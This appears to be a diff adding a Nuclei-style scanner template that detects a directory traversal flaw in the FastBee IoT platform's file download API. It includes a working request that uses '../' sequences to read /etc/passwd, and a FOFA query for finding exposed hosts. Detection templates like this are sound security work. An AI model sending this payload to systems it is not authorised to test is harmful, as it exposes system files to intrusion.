@@ -1,0 +1,26 @@
+id: fastbee-wjdq 
+
+info:  
+  name: Directory Traversal  
+  author: lyy 
+  severity: high  
+  description: Detect directory traversal vulnerabilities  
+  metadata:
+    max-request: 1
+    fofa-query: icon_hash="-307138793"
+    verified: true
+requests:  
+  - method: GET  
+    path:  
+      - "{{BaseURL}}/prod-api/iot/tool/download?fileName=/../../../../../../../../../etc/passwd"  
+    matchers:  
+      - type: status  
+        status:  
+          - 200  
+      - type: word  
+        words:  
+          - "root:"  
+          - "bin:"  
+          - "daemon:"  
+        condition: and  
+
